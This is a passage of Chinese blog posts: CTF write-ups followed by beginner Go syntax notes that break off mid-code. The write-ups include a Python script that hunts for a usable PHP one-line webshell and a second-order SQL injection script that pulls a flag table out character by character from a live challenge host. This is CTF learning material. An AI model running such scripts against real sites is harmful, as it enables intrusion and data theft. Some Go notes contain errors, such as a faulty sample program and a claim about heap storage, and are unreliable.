        <content type="html"><![CDATA[<h1 id="2-5W"><a href="#2-5W" class="headerlink" title="2.5W"></a>2.5W</h1><ol><li><p>   查看压缩包内容</p></li><li><p>  在源文件目录区解出一段base64，将此编码解密后得到flag的第一段</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221012190719.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220923195735.png"></p></li><li><p>  将压缩包拖入010editor中，查看文件尾得到最后一段flag</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220923200010.png"></p></li></ol><p>  ​      </p><h1 id="眼花缭乱"><a href="#眼花缭乱" class="headerlink" title="眼花缭乱"></a>眼花缭乱</h1><ol><li><p>  这个题目中有多个一句话木马，但是只有一个是可以的，其它的都将参数置为空了，无法利用</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220924091522.png"></p></li><li><p>手动寻找不现实，只能写脚本</p>  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> threading<span class="token keyword">import</span> time<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'开始时间：  '</span><span class="token operator">+</span>  time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>s1<span class="token operator">=</span>threading<span class="token punctuation">.</span>Semaphore<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span>    <span class="token comment">#这儿设置最大的线程数</span>filePath <span class="token operator">=</span> <span class="token string">r"D:\phpstudy_pro\WWW\src"</span>                 <span class="token comment">#指定文件路径</span>os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token comment">#改变当前工作的路径</span>requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>DEFAULT_RETRIES <span class="token operator">=</span> <span class="token number">5</span><span class="token comment">#设置重连次数，防止线程数过高，断开连接</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>                                        <span class="token comment">#os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>                                        <span class="token comment">#创建session对象</span>session<span class="token punctuation">.</span>keep_alive <span class="token operator">=</span> <span class="token boolean">False</span> <span class="token comment"># 设置连接活跃状态为False</span><span class="token keyword">def</span> <span class="token function">get_content</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                              <span class="token comment">#用来对单个php文件进行测试的函数</span>    s1<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'trying   '</span><span class="token operator">+</span><span class="token builtin">file</span><span class="token operator">+</span> <span class="token string">'     '</span><span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span><span class="token comment">#打开php文件，提取所有的$_GET和$_POST的参数</span>            gets <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_GET\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#获取文件中包含所有GET型参数的名字的列表</span>            posts <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_POST\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment">#获取文件中包含所有POST型参数的名字的列表</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">#所有的$_POST</span>    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">#所有的$_GET</span>    <span class="token keyword">for</span> m <span class="token keyword">in</span> gets<span class="token punctuation">:</span>                                                  <span class="token comment">#为所有的get型参数赋值存在字典中</span>        params<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"echo 'xxxxxx';"</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> posts<span class="token punctuation">:</span>                                                 <span class="token comment">#为所有的post型参数赋值存在字典中</span>        data<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"echo 'xxxxxx';"</span>    url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/src/'</span><span class="token operator">+</span><span class="token builtin">file</span>                          <span class="token comment">#放在自己的www目录下，进行拼接，方便request进行请求</span>    req <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span><span class="token comment">#一次性请求所有的GET和POST</span>    req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 关闭请求  释放内存</span>    req<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    content <span class="token operator">=</span> req<span class="token punctuation">.</span>text                                          <span class="token comment">#获取请求后网页的返回内容</span>    <span class="token keyword">if</span> <span class="token string">"xxxxxx"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span><span class="token comment">#判断phpecho语句是否被执行，如果发现有可以利用的参数，继续筛选出具体的参数</span>        flag <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> a <span class="token keyword">in</span> gets<span class="token punctuation">:</span>            req <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'?%s='</span><span class="token operator">%</span>a<span class="token operator">+</span><span class="token string">"echo 'xxxxxx';"</span><span class="token punctuation">)</span>            content <span class="token operator">=</span> req<span class="token punctuation">.</span>text            req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 关闭请求  释放内存</span>            <span class="token keyword">if</span> <span class="token string">"xxxxxx"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>                flag <span class="token operator">=</span> <span class="token number">1</span>                                            <span class="token comment">#表明是get型参数起作用</span>                <span class="token keyword">break</span>        <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> b <span class="token keyword">in</span> posts<span class="token punctuation">:</span>                req <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>b<span class="token punctuation">:</span><span class="token string">"echo 'xxxxxx';"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>                content <span class="token operator">=</span> req<span class="token punctuation">.</span>text                req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 关闭请求  释放内存</span>                <span class="token keyword">if</span> <span class="token string">"xxxxxx"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>                                 <span class="token comment">#表明是post型参数起作用</span>                    <span class="token keyword">break</span>        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span>            param <span class="token operator">=</span> a        <span class="token keyword">else</span><span class="token punctuation">:</span>            param <span class="token operator">=</span> b        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'找到了利用文件： '</span><span class="token operator">+</span><span class="token builtin">file</span><span class="token operator">+</span><span class="token string">"  and 找到了利用的参数：%s"</span> <span class="token operator">%</span>param<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'结束时间：  '</span> <span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s1<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> files<span class="token punctuation">:</span><span class="token comment">#加入多线程</span>   t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>get_content<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  在xk0SzyKwfzw.php文件中有一个一句话木马，可以进行get传参请求,进行命令执行</p></li><li><p>```php<br>  $XnEGfa = $_GET[‘Efa5BVG’] ?? ‘ ‘;</p>  <pre class="line-numbers language-none"><code class="language-none">7.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221012185724.png)8.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221012190214.png)9.   在根目录下找到了flag10.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221012190248.png)11.   cat出答案12.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221012190356.png)# mid_sql1.   这道题是一个二次注入2.   先用御剑扫一下，发现有另一个文件register.php，注册页面3.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220923203957.png)4.   当注册的用户名为1&#39; and &#39;1时,用户名为1，存在二次注入漏洞5.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220923205044.png)6.   写个脚本去跑7.   贴个脚本     &#96;&#96;&#96;php     #coding:utf-8     import requests     import re               url &#x3D; &#39;http:&#x2F;&#x2F;43.138.59.13:8309&#x2F;&#39;          m &#x3D; &#39;&#39;     for i in range(100):         payload &#x3D; &quot;0&#39;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#39;0&quot;.format(i+1)         register &#x3D; &#123;&#39;email&#39;:&#39;abc&#123;&#125;@qq.com&#39;.format(i),&#39;username&#39;:payload,&#39;password&#39;:&#39;123456&#39;&#125;         login &#x3D; &#123;&#39;email&#39;:&#39;abc&#123;&#125;@qq.com&#39;.format(i),&#39;password&#39;:&#39;123456&#39;&#125;         req &#x3D; requests.session()         r1 &#x3D; req.post(url+&#39;register.php&#39;,data &#x3D; register)         r2 &#x3D; req.post(url+&#39;login.php&#39;, data &#x3D; login)         r3 &#x3D; req.post(url+&#39;index.php&#39;)         content &#x3D; r3.text         # print(content)         con &#x3D; re.findall(&#39;&lt;span class&#x3D;&quot;user-name&quot;&gt;(.*?)&lt;&#x2F;span&gt;&#39;,content,re.S|re.M)         # re.findall也不错，也挺好，         # con &#x3D; re.search(&#39;&lt;span class&#x3D;&quot;user-name&quot;&gt;(.*)&lt;&#x2F;span&gt;&#39;,content,re.M|re.S)         # print(con[0].strip())         a &#x3D; int (con[0].strip())  # 转一下 类型，因为html中的是str的， 要转为int才行。         # print(type(a))         m &#x3D; m+chr(a)         print(m)          <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220923205750.png"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go语言语法</title>
      <link href="/go%E8%AF%AD%E8%A8%80%E8%AF%AD%E6%B3%95/"/>
      <url>/go%E8%AF%AD%E8%A8%80%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="go语言"><a href="#go语言" class="headerlink" title="go语言"></a>go语言</h1><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220921171704.png"></li></ol><h2 id="第一个go语言"><a href="#第一个go语言" class="headerlink" title="第一个go语言"></a>第一个go语言</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Hello world"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="go语言基础组成"><a href="#go语言基础组成" class="headerlink" title="go语言基础组成"></a>go语言基础组成</h2><ol><li>  包声明</li><li>  引入包</li><li>  函数</li><li>  函数</li><li>  变量</li><li>  语句&amp;表达式</li><li>  注释</li></ol><h3 id="各个部分"><a href="#各个部分" class="headerlink" title="各个部分"></a>各个部分</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220921171944.png"></li><li>  第一行代码 <em>package main</em> 定义了包名。你必须在源文件中非注释的第一行指明这个文件属于哪个包，如：package main。package main表示一个可独立执行的程序，每个 Go 应用程序都包含一个名为 main 的包。</li><li>  下一行 <em>import “fmt”</em> 告诉 Go 编译器这个程序需要使用 fmt 包（的函数，或其他元素），fmt 包实现了格式化 IO（输入/输出）的函数  fmt包：format</li><li>  下一行 <em>func main()</em> 是程序开始执行的函数。main 函数是每一个可执行程序所必须包含的，一般来说都是在启动后第一个执行的函数（如果有 init() 函数则会先执行该函数）。</li><li>  下一行 /<em>…</em>/ 是注释，在程序执行时将被忽略。单行注释是最常见的注释形式，你可以在任何地方使用以 // 开头的单行注释。多行注释也叫块注释，均已以 /* 开头，并以 */ 结尾，且不可以嵌套使用，多行注释一般用于包的文档描述或注释成块的代码片段。 </li><li>下一行 <em>fmt.Println(…)</em> 可以将字符串输出到控制台，并在最后自动增加换行字符 \n。<br>  使用 fmt.Print(“hello, world\n”) 可以得到相同的结果。<br>   Print 和 Println 这两个函数也支持使用变量，如：fmt.Println(arr)。如果没有特别指定，它们会以默认的打印格式将变量 arr 输出到控制台。</li><li>  当标识符（包括常量、变量、类型、函数名、结构字段等等）以一个大写字母开头，如：Group1，那么使用这种形式的标识符的对象就可以被外部包的代码所使用（客户端程序需要先导入这个包），这被称为导出（像面向对象语言中的 public）；标识符如果以小写字母开头，则对包外是不可见的，但是他们在整个包的内部是可见并且可用的（像面向对象语言中的 protected  ）。</li><li>  <strong>即大写字母开头为public , 小写字母开头为protected</strong></li></ol><h2 id="执行go"><a href="#执行go" class="headerlink" title="执行go"></a>执行go</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">go</span> run hello<span class="token punctuation">.</span><span class="token keyword">go</span> <span class="token comment">//编译并执行代码</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">go</span> build hello<span class="token punctuation">.</span><span class="token keyword">go</span> <span class="token comment">//go build命令来生成二进制文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p>  生成的二进制文件没有.go后缀，直接 <strong>./文件名</strong> 即可运行程序</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220921173130.png"></p></li></ol><h2 id="自动编译脚本"><a href="#自动编译脚本" class="headerlink" title="自动编译脚本"></a>自动编译脚本</h2><ol><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220921173327.png"></p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go">#<span class="token operator">!</span><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>env bashCURRENT_DIR<span class="token operator">=</span><span class="token string">`pwd`</span>OLD_GO_PATH<span class="token operator">=</span><span class="token string">"$GOPATH"</span>  #例如<span class="token punctuation">:</span> <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token keyword">go</span>OLD_GO_BIN<span class="token operator">=</span><span class="token string">"$GOBIN"</span>    #例如<span class="token punctuation">:</span> <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token keyword">go</span><span class="token operator">/</span>binexport GOPATH<span class="token operator">=</span><span class="token string">"$CURRENT_DIR"</span> export GOBIN<span class="token operator">=</span><span class="token string">"$CURRENT_DIR/bin"</span>#指定并整理当前的源码路径gofmt <span class="token operator">-</span>w src<span class="token keyword">go</span> install test_helloexport GOPATH<span class="token operator">=</span><span class="token string">"$OLD_GO_PATH"</span>export GOBIN<span class="token operator">=</span><span class="token string">"$OLD_GO_BIN"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="关于包"><a href="#关于包" class="headerlink" title="关于包"></a>关于包</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220921173409.png"></li><li>  同一个文件夹下的文件只能有一个包名，否则会编译报错</li></ol><h2 id="行分隔符"><a href="#行分隔符" class="headerlink" title="行分隔符"></a>行分隔符</h2><ol><li><p>在 Go 程序中，一行代表一个语句结束。每个语句不需要像 C 家族中的其它语言一样以分号 ; 结尾，因为这些工作都将由 Go 编译器自动完成。</p><p>  如果你打算将多个语句写在同一行，它们则必须使用 ; 人为区分，但在实际开发中我们并不鼓励这种做法。</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go">fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Hello, World!"</span><span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"菜鸟教程：runoob.com"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h2 id="Go-语言的空格"><a href="#Go-语言的空格" class="headerlink" title="Go 语言的空格"></a>Go 语言的空格</h2><ol><li><p>Go 语言中变量的声明必须使用空格隔开</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> age <span class="token builtin">int</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><pre class="line-numbers language-none"><code class="language-none">fmt.Sprintf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p>  使用fmt.Sprintf格式化字符串并赋值给新串</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220921175725.png"></p></li></ol><h2 id="go语言变量"><a href="#go语言变量" class="headerlink" title="go语言变量"></a>go语言变量</h2><ol><li><p>声明变量的一般形式是使用<strong>var关键字</strong></p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> identifier <span class="token keyword">type</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>也可以一次声明多个变量</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> identifier1<span class="token punctuation">,</span>identifier2 <span class="token keyword">type</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> a <span class="token builtin">string</span> <span class="token operator">=</span> <span class="token string">"Runoob"</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">var</span> b<span class="token punctuation">,</span>c <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h2><ol><li><p>第一种，指定变量类型，如果没有初始值，则变量默认为0值</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> v_name v_typev_name <span class="token operator">=</span> v_type<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>零值就是变量没有做初始化时系统默认设置的值</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token string">"Runoob"</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>        <span class="token keyword">var</span> a <span class="token builtin">int</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token comment">//int值默认为0</span>        <span class="token keyword">var</span> c <span class="token builtin">bool</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token comment">//bool值默认是false</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>第二种，根据值自行判定变量类型</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> v_name <span class="token operator">=</span> value<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>第三种，如果变量已经使用var声明过了，再使用 := 声明变量，就产生编译错误</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> intVal <span class="token builtin">int</span><span class="token comment">//下面不能使用 intVal := 1,因为intVal 已经声明，不需要重新声明</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>第四种，直接使用 := 来声明即可</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go">intVal <span class="token operator">:=</span> <span class="token number">1</span> <span class="token comment">//此时不会产生编译错误，因为有声明新的变量，因为:=是一个声明语句</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> intVal <span class="token builtin">int</span>intVal <span class="token operator">=</span> <span class="token number">1</span><span class="token comment">//和上面:=声明赋值相同</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="多变量声明"><a href="#多变量声明" class="headerlink" title="多变量声明"></a>多变量声明</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">//类型相同的多个变量，而非全局变量</span><span class="token keyword">var</span> vname1<span class="token punctuation">,</span>vname2<span class="token punctuation">,</span>vname3 <span class="token keyword">type</span>vname1<span class="token punctuation">,</span>vname2<span class="token punctuation">,</span>vname3 <span class="token operator">=</span> v1<span class="token punctuation">,</span>v2<span class="token punctuation">,</span>v3<span class="token keyword">var</span> vname1<span class="token punctuation">,</span>vname2<span class="token punctuation">,</span>vname3 <span class="token operator">=</span> v1<span class="token punctuation">,</span>v2<span class="token punctuation">,</span>v3vname1<span class="token punctuation">,</span>vname2<span class="token punctuation">,</span>vname3 <span class="token operator">:=</span> v1<span class="token punctuation">,</span>v2<span class="token punctuation">,</span>v3 <span class="token comment">//出现在:=左侧的变量不应该是已经被声明过的，否则会导致编译错误</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>我的理解：</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// var关键字用来声明</span><span class="token comment">// :=用来在赋值之前进行声明</span><span class="token comment">// 使用 := 不带var关键字声明格式的只能在函数体中出现，不能和全局变量一样放到</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>声明全局变量的隐式分解的写法</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span><span class="token punctuation">(</span>vname1 v_type1vname2 v_type2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="值类型"><a href="#值类型" class="headerlink" title="值类型"></a>值类型</h3><ol><li>  所有像int,float,bool,string这些基本类型都属于值类型，使用这些类型的变量都直接指向存在内存中的值</li><li>  当使用等号 <code>=</code> 将一个变量的值赋值给另一个变量时，如：<code>j = i</code>，实际上是在内存中将 i 的值进行了拷贝：</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220921210003.png"></li><li>  <strong>值类型变量的值都存储在堆中</strong></li></ol><h3 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h3><ol><li>  一个引用类型的变量存储的是这个变量所在的内存地址，或者内存地址中第一个字所在的位置</li><li>  并不是去直接存值</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220921210544.png"></li><li>  当使用赋值语句r2 = r1时，只有引用地址被复制</li><li>  <strong>如果r1的值改变了，那么这个值的所有引用都会指向被修改后的内容</strong>，在这个例子中，r2也会受到影响</li></ol><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ol><li>  如果在相同的代码块中，我们<strong>不可以再次对于相同名称的变量使用初始化声明</strong></li><li>  在函数中单纯地给 a 赋值（将a定义为非全局变量）也是不够的，这个值必须被使用（就是声明定义的变量必须使用）</li><li>  但是全局变量是允许声明但是不使用的，同一个类型的多个变量可以声明在同一行</li><li>  交换两个变量的值：a,b=b,a  两个变量的类型必须相同</li><li>  空白标识符也被用于抛弃值， _,b = 5,7 ,将得到结果为a没有值，b的值为7</li></ol><h3 id="简短形式"><a href="#简短形式" class="headerlink" title="简短形式"></a>简短形式</h3><ol><li>  使用 := 赋值操作符</li><li>  声明语句写var显得有些多余了，如果不是定义全局变量，则不需要写var</li><li>  变量的首选是用 := ，但是只能被用于函数体内，而不可以用于全局变量的声明与赋值</li></ol><h2 id="go语言常量"><a href="#go语言常量" class="headerlink" title="go语言常量"></a>go语言常量</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">const</span> identifier <span class="token punctuation">[</span><span class="token keyword">type</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p>可以省略类型说明符，因为编译器可以根据变量的值来推断其类型</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">const</span> b <span class="token builtin">string</span> <span class="token operator">=</span> <span class="token string">"abc"</span> <span class="token comment">//显示声明</span><span class="token keyword">const</span> b <span class="token operator">=</span> <span 